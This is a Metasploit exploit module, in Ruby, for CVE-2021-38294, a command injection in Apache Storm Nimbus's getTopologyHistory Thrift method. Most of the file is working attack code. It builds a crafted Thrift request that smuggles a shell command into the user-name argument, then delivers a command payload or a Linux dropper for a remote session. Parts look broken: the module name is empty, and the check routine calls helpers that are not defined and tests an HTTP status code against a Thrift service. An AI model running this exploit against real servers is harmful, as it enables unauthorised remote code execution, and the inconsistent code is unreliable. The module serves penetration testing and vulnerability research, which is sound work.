##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  # prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => '',
        'Description' => %q{
          This module exploits a command injection vulnerability within the Nimbus service's getTopologyHistory RPC
          method. The method takes a single argument which is the name of a user which is concatenated into a string
          that is executed by bash. In order for the vulnerability to be exploitable, there must have been at least one
          topology submitted to the server. The topology may be active or inactive, but at least one must be present.
        },
        'Author' => [
          'Alvaro MuÃ±oz', # discovery and original research
          'Spencer McIntyre', # metasploit module
        ],
        'References' => [
          ['CVE', '2021-38294'],
          ['URL', 'https://securitylab.github.com/advisories/GHSL-2021-085-apache-storm/']
        ],
        'DisclosureDate' => '2021-10-28',
        'License' => MSF_LICENSE,
        'Platform' => ['linux', 'unix'],
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' => true,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :linux_dropper
            }
          ]
        ],
        'DefaultTarget' => 1,
        'DefaultOptions' => {
          'RPORT' => 6627,
          'MeterpreterTryToFork' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
  end

  def check
    http_res = send_command('id')
    return CheckCode::Unknown if http_res.nil?
    return CheckCode::Safe unless http_res.code == 200

    cmd_res = parse_response(http_res)
    return CheckCode::Unknown if cmd_res.nil? || cmd_res[:stdout] !~ /uid=(\d+)\(\S+\) /

    return CheckCode::Vulnerable("Command executed as uid #{Regexp.last_match(1)}.")
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")

    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager
    end
  end

  def execute_command(cmd, _opts = {})
    lock_file = "/tmp/#{Rex::Text.rand_text_alphanumeric(12)}"

    # if there are multiple topologies, the command will be executed more than once, so use a lock file to prevent that
    cmd = "if [ ! -f #{lock_file} ]; then touch #{lock_file}; #{cmd}; fi"
    sock = connect
    vprint_status("Running: #{cmd}")

    request = [
      Thrift::Header.new(message_type: Thrift::MessageType::CALL, method_name: 'getTopologyHistory'),
      Thrift::Data.new(data_type: Thrift::DataType::T_UTF7, field_id: 1, data_value: ";#{cmd}"),
      Thrift::Data.new(data_type: Thrift::DataType::T_STOP)
    ].map(&:to_binary_s).join

    sock.put([ request.length ].pack('N') + request)
    disconnect
  end

  module Thrift
    class DataType
      T_STOP = 0
      T_UTF7 = 11
    end

    class MessageType
      CALL = 1
      REPLY = 2
    end

    class Header < BinData::Record
      endian :big

      uint16 :version, initial_value: 0x8001
      uint16 :message_type
      uint32 :method_name_length, value: -> { method_name.length }
      string :method_name, read_length: :method_name_length
      uint32 :sequence_id
    end

    class Data < BinData::Record
      endian :big

      uint8  :data_type
      uint16 :field_id, onlyif: -> { data_type != DataType::T_STOP }
      uint32 :data_length, onlyif: -> { data_type != DataType::T_STOP }, value: -> { data_value.length }
      choice :data_value, onlyif: -> { data_type != DataType::T_STOP }, selection: :data_type do
        string DataType::T_UTF7
      end
    end
  end
end
